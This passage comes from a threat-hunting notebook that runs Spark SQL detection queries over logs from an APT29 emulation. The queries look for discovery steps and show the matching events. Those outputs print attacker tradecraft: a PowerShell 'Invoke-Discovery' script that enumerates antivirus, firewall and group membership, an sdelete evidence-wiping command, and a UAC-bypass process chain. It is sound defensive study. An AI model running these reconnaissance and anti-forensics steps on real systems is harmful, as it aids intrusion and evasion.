TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:4D6DE690-E92C-4D60-93E6-8E5C7C4DF143</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">SELECT d.NewProcessId</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN(</span>
<span class="sd">  SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">  FROM apt29Host a</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">  ) b</span>
<span class="sd">  ON a.ProcessId = b.NewProcessId</span>
<span class="sd">  WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">    AND a.EventID = 4688</span>
<span class="sd">    AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">    AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessId = c.NewProcessId</span>
<span class="sd">WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">  AND d.EventID = 4688</span>
<span class="sd">  AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.NewProcessId</span>
<span class="sd">WHERE LOWER(f.Channel) = &quot;security&quot;</span>
<span class="sd">AND f.EventID = 4688</span>
<span class="sd">AND LOWER(f.NewProcessName) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">AND LOWER(f.CommandLine) LIKE &#39;%sysinternalssuite.zip&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2290
	New Process Name:	C:\Program Files\SysinternalsSuite\sdelete64.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xf24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	&quot;C:\Program Files\SysinternalsSuite\sdelete64.exe&quot; /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-1-file-and-directory-discovery">
<h2>4.C.1. File and Directory Discovery<a class="headerlink" href="#c-1-file-and-directory-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated user’s temporary directory path using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing $env:TEMP</p>
<div class="section" id="id26">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:85BFD73C-875E-4208-AD9E-1922D4D4D991</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:temp%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:D18CF7B9-CBF0-40CE-9D07-12DC83AF3B2F</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:temp%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-2-system-owner-user-discovery">
<h2>4.C.2. System Owner/User Discovery<a class="headerlink" href="#c-2-system-owner-user-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated the current username using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing $env:USERNAME</p>
<div class="section" id="id27">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:A45F53ED-65CB-4739-A4D3-F2B0F08F86F8</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:username%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

ScriptBlock ID: 806f4593-7cce-4e2c-8645-8cb798c3bedd
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:6F3D1615-69D6-41C6-90D0-39ACA14941BD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:username%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like &quot;*\$env:USERNAME&quot; } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

ScriptBlock ID: 806f4593-7cce-4e2c-8645-8cb798c3bedd
Path:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-3-system-information-discovery">
<h2>4.C.3. System Information Discovery<a class="headerlink" href="#c-3-system-information-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated the computer hostname using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing $env:COMPUTERNAME</p>
<div class="section" id="id28">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:9B610803-2B27-4DA4-9AAC-C859F48510DA</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:computername%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
